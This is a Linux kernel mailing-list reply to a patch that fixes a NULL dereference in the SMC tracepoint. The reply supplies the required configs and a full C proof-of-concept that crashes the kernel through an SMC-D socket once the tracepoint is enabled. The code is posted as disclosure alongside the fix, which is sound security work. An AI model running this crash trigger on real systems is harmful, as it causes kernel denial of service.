Return-Path: <linux-rdma+bounces-20328-lists+linux-rdma=lfdr.de@vger.kernel.org>
Delivered-To: lists+linux-rdma@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id sA0+HbELAWqSQAEAu9opvQ
	(envelope-from <linux-rdma+bounces-20328-lists+linux-rdma=lfdr.de@vger.kernel.org>)
	for <lists+linux-rdma@lfdr.de>; Mon, 11 May 2026 00:50:25 +0200
X-Original-To: lists+linux-rdma@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id CE19F506BB5
	for <lists+linux-rdma@lfdr.de>; Mon, 11 May 2026 00:50:24 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 194D4300D961
	for <lists+linux-rdma@lfdr.de>; Sun, 10 May 2026 22:50:22 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id B10BF3A542E;
	Sun, 10 May 2026 22:50:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="s8x0IL2f"
X-Original-To: linux-rdma@vger.kernel.org
Received: from mail-pg1-f181.google.com (mail-pg1-f181.google.com [209.85.215.181])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1A4093612F0
	for <linux-rdma@vger.kernel.org>; Sun, 10 May 2026 22:50:18 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.215.181
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1778453420; cv=pass; b=jS1vi48WGHaUJqfBy1wh5n+T3F6n+IUV3XaEkPXTsVht76zcglbC6ca9yzrhs9xKAxSbIQHTj+58Vd8gjB7OHEIAXtrQlHzkgf8EzySXBQzO9A0S0v14mhh+PoyMYYxDamFVvCsDxSqofSoiHC6zi22dbDHYXGbyYOv145Yn9bk=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1778453420; c=relaxed/simple;
	bh=GdDuPUl/5DODk9Ku20HqiyncCvH+aaXy4qnWJ3JrMsY=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=d48+xMtTsJdhykZQjXp+518YyzCAckrqBVB7J0ChQZ6TMWTPxb10N8OCgwL/RD20jM2eVDQgMTVghYzTkWhcG0IxbUW0ojc71yLmLZGwZt2UtN0NCA/tUhO6qEmK83XIn3vy6yy5olALKe2XyUVLMRDgvCKEuMhPDFLkFLn7lsI=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=s8x0IL2f; arc=pass smtp.client-ip=209.85.215.181
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-pg1-f181.google.com with SMTP id 41be03b00d2f7-c798fc1a28cso1509827a12.3
        for <linux-rdma@vger.kernel.org>; Sun, 10 May 2026 15:50:18 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1778453418; cv=none;
        d=google.com; s=arc-20240605;
        b=KS4TEv9VS7CTgwmFLiqX666LjH1TSv0lhtQykd4qOrlv32wV61ISGvdAJMvF9Pb+JY
         7FYREa2n1XgRXCr9wwrx/49LUwWFbN025+2yyXVD+0HiraZ0hZWuDxH6yLw4b0c55iXH
         +tbWYbUk0dGdFvpldzFRAu0cYYdY2pf9aWcbmDiezbsTmxm+bGS1iOjYAigsPzGUGnQZ
         gpsmJcf4Rhwc1CO4SeAoGR9aZbPQQu/HRHgRzPiwZesYW+0DnfcVL45E6mnxLQMpXfB/
         62S/qPaLNMBl1J288BqXdHisMSLfB+BmZEc5rqRPasw6KRZGxrm3ikEU3OIOHA9DwRaS
         cC9A==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=QQ4ZFhALull78SbemBQoH8t5StYSJiTbmXg8pgI2Izo=;
        fh=o6oe2OAlh+unxzYO6qCh7PH82PQYF9VAqksNEHhowDY=;
        b=YMuOrNNZbqk1+dIHeEeA8WvevXlCHydlQBMlVJD4rqBwnzv5qc0FOsqseq60pxuYSC
         e4HXaxlBXtPXQ0rBFm248PYBwULIyRugeZt/NnvG4FdPSmKvvHOYDQiuQfGVskTLUKb3
         Dz18E2AOx3f2xJSs8aRUBYW8Orj/o5qITqZQceRJQviTUaNDGeMxVt/tZzfr5+3Ji8So
         Drqb0Anmlg4nZpHjgG32znP816G5NTOQ/ghDxxrtImxjFaoJ1AaLROUYB8cFgkaszk0n
         3THZXu8GqVJAUpFwgr7Y4s4xKp08s91Yid6hE2+kPon14U7U/0D82Z/7s/yfpLQrX6ey
         2IUQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1778453418; x=1779058218; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=QQ4ZFhALull78SbemBQoH8t5StYSJiTbmXg8pgI2Izo=;
        b=s8x0IL2fMPMzNEhZyKGegtmVKKzEozz18D92S+T5AU2dcfH/74CCsVv9m17plv+W0M
         STB0mgomkSpj3ucXTwXNCrHaPQ3JNCRHngMwysf7w8SvniDrTJ7Wo721vkW6VbIfNYiT
         5p0MBXanm6EWduAsqkU3byP7783sP7uoyg+zaSKDbZgawqA7mztke79knQTGCDMYl0aI
         YdzX/AIv06aXnKtQkXQnTU5S2THu9v7D/tAffA1ivAkD4rbbi8mhlxQwXw5maL/ap2/2
         SgLd4fmOdEdFqtsVkRZ7D3XBB3DryzK57TeM2Xo0JHHbV19UzrZJN1e8SwR3QHI7ETNF
         Avlg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1778453418; x=1779058218;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=QQ4ZFhALull78SbemBQoH8t5StYSJiTbmXg8pgI2Izo=;
        b=ZqmtoUCGbCbiRKQIMZD4e6hA9edxQIErZ4SscaC/1Aiu4OfnS05Q4+fx/zWbd+6q1J
         AQB/Tv56D9dWWOEZ0MWyhJt25gVLWzWd67G49B4MyoBBcg+8tZn9P/8G5fBzheHC0PRX
         wNiEHBbZFykBtQYhFgvgo+y+BZPJbFXZBzHXiMV2hMhrBl2bILNAx7hUd0B+LGaYTFmx
         3ErbQT0gGWr5KDbU/jggeLEB5v0BnIbWIQQHWVzVIDuyoV/vTsGthKZClHLpnLg6C9xJ
         L4PkwGCzj3B7vCDfp6ASWpRSu+OoE2/zCTt60+/547IVcMY73SRde1b14jLbix2X5lQv
         KDgQ==
X-Forwarded-Encrypted: i=1; AFNElJ+/gjjFeDDFBIAZYsk8jK1HpIAz2ViHkLMxjVASSgDx6NAnIG1K/KedEjY/RgyunPEjXHwIc2E+79VY@vger.kernel.org
X-Gm-Message-State: AOJu0Yxe0SPtA7li0YEBS92Oo87wPPmPtpAi4NeoVH84Rnx7liisKJgw
	Mk6ggvh3BCsHjdGdi/1vDq5n/22EkFi7HAFzBtxccp2vqiDd+SHz61Xl7hk2jaSanXJg4nqldYk
	T8h/dll4aloQK40QSzdd/GTTJGbjaB2hn96QTLCHg
X-Gm-Gg: Acq92OGK+fzXUrhsbRZJ1P86kj9gISAJWuFRN3hdr60xqSeykGhx0T4rOZDnVKjhY+M
	r0tEL3vkZplGLkWmri3/ntE9JBsJlgK9vlp15r5g7OAo1wpPbFyzE2yElWlZDHrPIpeirNhdSgI
	oAHG5MUrqK3WV+gym3Y6TkYt6UYYoWm11RVhOOUXS32Vi4b3WxoFokaVw9o5bcTtGmJMaNTL1wG
	bDBAPEIUZ6pdx1OWynu9W/Saky1xg6potmw8GxJvSt3BNiTYdNDHwf5SXBSLTdWk4D3PWXsAxYk
	5I9Kl7dWTizLbJ3IrNU=
X-Received: by 2002:a17:902:cec8:b0:2b2:57df:264d with SMTP id
 d9443c01a7336-2ba794b969emr232289395ad.33.1778453418291; Sun, 10 May 2026
 15:50:18 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260510222640.1230720-1-xmei5@asu.edu>
In-Reply-To: <20260510222640.1230720-1-xmei5@asu.edu>
From: Xiang Mei <xmei5@asu.edu>
Date: Sun, 10 May 2026 15:50:07 -0700
X-Gm-Features: AVHnY4Lx7pvJLi9l8e3YnSoRtbj4JqeWz9uDQ5uIgVEZDDZubYvWHBJqDJyiZBA
Message-ID: <CAPpSM+Rhq8UjdGVfAY5v8sX1N81wExMxZck0nPPYcFq69kijdA@mail.gmail.com>
Subject: Re: [PATCH net] net/smc: avoid NULL deref of conn->lnk in
 smc_msg_event tracepoint
To: netdev@vger.kernel.org
Cc: alibuda@linux.alibaba.com, dust.li@linux.alibaba.com, wenjia@linux.ibm.com, 
	sidraya@linux.ibm.com, tonylu@linux.alibaba.com, linux-rdma@vger.kernel.org, 
	linux-s390@vger.kernel.org, bestswngs@gmail.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Rspamd-Queue-Id: CE19F506BB5
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [3.34 / 15.00];
	SEM_URIBL(3.50)[asu.edu:email,asu.edu:dkim];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	BAD_REP_POLICIES(0.10)[];
	HAS_LIST_UNSUB(-0.01)[];
	FROM_HAS_DN(0.00)[];
	DMARC_POLICY_ALLOW(0.00)[asu.edu,none];
	FREEMAIL_CC(0.00)[linux.alibaba.com,linux.ibm.com,vger.kernel.org,gmail.com];
	TAGGED_FROM(0.00)[bounces-20328-lists,linux-rdma=lfdr.de];
	RCVD_TLS_LAST(0.00)[];
	R_DKIM_ALLOW(0.00)[asu.edu:s=google];
	DKIM_TRACE(0.00)[asu.edu:+];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
	MIME_TRACE(0.00)[0:+];
	TO_DN_NONE(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,linux-rdma@vger.kernel.org];
	MISSING_XM_UA(0.00)[];
	NEURAL_HAM(-0.00)[-0.633];
	TAGGED_RCPT(0.00)[linux-rdma];
	RCPT_COUNT_SEVEN(0.00)[9];
	ARC_ALLOW(0.00)[subspace.kernel.org:s=arc-20240116:i=2];
	R_SPF_ALLOW(0.00)[+ip4:172.234.253.10:c];
	DBL_BLOCKED_OPENRESOLVER(0.00)[mail.gmail.com:mid,asu.edu:email,asu.edu:dkim,sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns]
X-Rspamd-Action: no action

Thanks for your attention to this bug. Here are some resources to help
you trigger the bug.

Required configs:
```
CONFIG_SMC=3Dy
CONFIG_DIBS=3Dy
CONFIG_DIBS_LO=3Dy
CONFIG_SMC_DIAG=3Dy
```

Here is a PoC trigger that causes the intended crash shown in the commi mes=
sage:
```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>

#define AF_SMC 43
#define PORT   30421
#define SMC_NETLINK_ADD_UEID    10
#define SMC_NETLINK_ENABLE_SEID 14
#define SMC_NLA_EID_TABLE_ENTRY 1
#define SMC_MAX_EID_LEN 32

struct nl_req {
    struct nlmsghdr  nh;
    struct genlmsghdr gh;
    char buf[64];
};

static int resolve_smc_family(int fd) {
    struct nl_req req =3D {0};
    const char *name =3D "SMC_GEN_NETLINK";
    int name_len =3D strlen(name) + 1;

    req.nh.nlmsg_type  =3D GENL_ID_CTRL;
    req.nh.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
    req.nh.nlmsg_seq   =3D 1;
    req.gh.cmd         =3D CTRL_CMD_GETFAMILY;
    req.gh.version     =3D 1;
    struct nlattr *na =3D (struct nlattr *)req.buf;
    na->nla_type =3D CTRL_ATTR_FAMILY_NAME;
    na->nla_len  =3D NLA_HDRLEN + name_len;
    memcpy((char *)na + NLA_HDRLEN, name, name_len);
    req.nh.nlmsg_len =3D NLMSG_HDRLEN + sizeof(req.gh) + NLA_ALIGN(na->nla_=
len);
    send(fd, &req, req.nh.nlmsg_len, 0);

    char resp[1024];
    int n =3D recv(fd, resp, sizeof(resp), 0);
    if (n < 0) return -1;
    struct nlmsghdr *nh =3D (struct nlmsghdr *)resp;
    struct genlmsghdr *gh =3D NLMSG_DATA(nh);
    int len =3D nh->nlmsg_len - NLMSG_LENGTH(sizeof(*gh));
    struct nlattr *attr =3D (struct nlattr *)((char *)gh + sizeof(*gh));
    while (len > 0 && (int)attr->nla_len <=3D len) {
        if (attr->nla_type =3D=3D CTRL_ATTR_FAMILY_ID)
            return *(uint16_t *)((char *)attr + NLA_HDRLEN);
        int aligned =3D NLA_ALIGN(attr->nla_len);
        attr =3D (struct nlattr *)((char *)attr + aligned);
        len -=3D aligned;
    }
    return -1;
}

static void smc_genl(int fd, int family_id, int cmd, struct nlattr *na) {
    struct nl_req req =3D {0};
    req.nh.nlmsg_type  =3D family_id;
    req.nh.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
    req.nh.nlmsg_seq   =3D 2;
    req.gh.cmd         =3D cmd;
    req.gh.version     =3D 1;
    int payload =3D sizeof(req.gh);
    if (na) {
        memcpy(req.buf, na, na->nla_len);
        payload +=3D NLA_ALIGN(na->nla_len);
    }
    req.nh.nlmsg_len =3D NLMSG_HDRLEN + payload;
    send(fd, &req, req.nh.nlmsg_len, 0);
    char resp[256];
    recv(fd, resp, sizeof(resp), 0);
}

static void write_str(const char *path, const char *val) {
    int fd =3D open(path, O_WRONLY);
    if (fd < 0) return;
    write(fd, val, strlen(val));
    close(fd);
}

static void *server_thread(void *arg) {
    int srv =3D socket(AF_SMC, SOCK_STREAM, 0);
    int one =3D 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa =3D {0};
    sa.sin_family =3D AF_INET;
    sa.sin_port =3D htons(PORT);
    sa.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK);
    bind(srv, (struct sockaddr *)&sa, sizeof(sa));
    listen(srv, 1);
    accept(srv, NULL, NULL);
    sleep(5);
    return NULL;
}

int main(void) {
    mkdir("/sys/kernel/tracing", 0755);
    mount("nodev", "/sys/kernel/tracing", "tracefs", 0, NULL);
    // Imitate the enviroment with smc_tx_sendmsg enabled
    write_str("/sys/kernel/tracing/events/smc/smc_tx_sendmsg/enable", "1");

    int nl =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    int fid =3D resolve_smc_family(nl);

    smc_genl(nl, fid, SMC_NETLINK_ENABLE_SEID, NULL);

    /* ADD_UEID: 32-byte EID padded with spaces, trailing NUL. */
    char buf[NLA_HDRLEN + SMC_MAX_EID_LEN + 1] =3D {0};
    struct nlattr *na =3D (struct nlattr *)buf;
    na->nla_type =3D SMC_NLA_EID_TABLE_ENTRY;
    na->nla_len  =3D NLA_HDRLEN + SMC_MAX_EID_LEN + 1;
    char *eid =3D buf + NLA_HDRLEN;
    memset(eid, ' ', SMC_MAX_EID_LEN);
    memcpy(eid, "TESTUEID", 8);
    smc_genl(nl, fid, SMC_NETLINK_ADD_UEID, na);
    close(nl);

    pthread_t tid;
    pthread_create(&tid, NULL, server_thread, NULL);
    usleep(500000);

    int cli =3D socket(AF_SMC, SOCK_STREAM, 0);
    struct sockaddr_in sa =3D {0};
    sa.sin_family =3D AF_INET;
    sa.sin_port =3D htons(PORT);
    sa.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK);
    connect(cli, (struct sockaddr *)&sa, sizeof(sa));
    send(cli, "x", 1, 0);  /* trace_smc_tx_sendmsg -> NULL deref via
smc->conn.lnk */
    sleep(2);
    return 0;
}
```

Feel free to ask for more information.
Thanks,
Xiang

On Sun, May 10, 2026 at 3:26=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
>
> The smc_msg_event tracepoint class, shared by smc_tx_sendmsg and
> smc_rx_recvmsg, unconditionally dereferences smc->conn.lnk:
>
>         __string(name, smc->conn.lnk->ibname)
>
> conn->lnk is only set for SMC-R; for SMC-D it is NULL. Other code on
> these paths already handles this (e.g. !conn->lnk in
> SMC_STAT_RMB_TX_SIZE_SMALL()). With the tracepoint enabled, the first
> sendmsg()/recvmsg() on an SMC-D socket crashes:
>
>   Oops: general protection fault, probably for non-canonical address
>   KASAN: null-ptr-deref in range [...]
>   RIP: 0010:strlen+0x1e/0xa0
>   Call Trace:
>    trace_event_raw_event_smc_msg_event (net/smc/smc_tracepoint.h:44)
>    smc_rx_recvmsg (net/smc/smc_rx.c:515)
>    smc_recvmsg (net/smc/af_smc.c:2859)
>    __sys_recvfrom (net/socket.c:2315)
>    __x64_sys_recvfrom (net/socket.c:2326)
>    do_syscall_64
>
> The faulting address 0x3e0 is offsetof(struct smc_link, ibname),
> confirming the NULL ->lnk deref. Enabling the tracepoint requires
> root, but the trigger itself is unprivileged: socket(AF_SMC, ...) has
> no capability check, and SMC-D negotiation needs no admin step on
> s390 or on x86 with the loopback ISM device loaded.
>
> Log an empty device name for SMC-D instead of dereferencing NULL.
>
> Fixes: aff3083f10bf ("net/smc: Introduce tracepoints for tx and rx msg")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Assisted-by: Claude:claude-opus-4-7
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  net/smc/smc_tracepoint.h | 2 +-
>  1 file changed, 1 insertion(+), 1 deletion(-)
>
> diff --git a/net/smc/smc_tracepoint.h b/net/smc/smc_tracepoint.h
> index a9a6e3c1113a..53da84f57fd6 100644
> --- a/net/smc/smc_tracepoint.h
> +++ b/net/smc/smc_tracepoint.h
> @@ -51,7 +51,7 @@ DECLARE_EVENT_CLASS(smc_msg_event,
>                                      __field(const void *, smc)
>                                      __field(u64, net_cookie)
>                                      __field(size_t, len)
> -                                    __string(name, smc->conn.lnk->ibname=
)
> +                                    __string(name, smc->conn.lnk ? smc->=
conn.lnk->ibname : "")
>                     ),
>
>                     TP_fast_assign(
> --
> 2.43.0
>

